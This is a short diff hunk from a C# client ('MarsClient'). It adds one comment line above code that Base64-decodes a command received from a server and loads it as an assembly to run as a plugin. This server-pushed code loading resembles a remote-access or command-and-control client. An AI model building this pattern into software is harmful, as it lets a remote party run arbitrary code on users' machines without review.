@@ -188,6 +188,7 @@ namespace MarsClient
             //saves a file transfered from the server
             //should take real commands to run with real plugins
             //that are loaded with assembly from a dll
+            //legacy 
             Assembly asm = Assembly.Load(Base64DecodeFile(command));
             /*
             * this should search through all classes to find the Main or other starting method
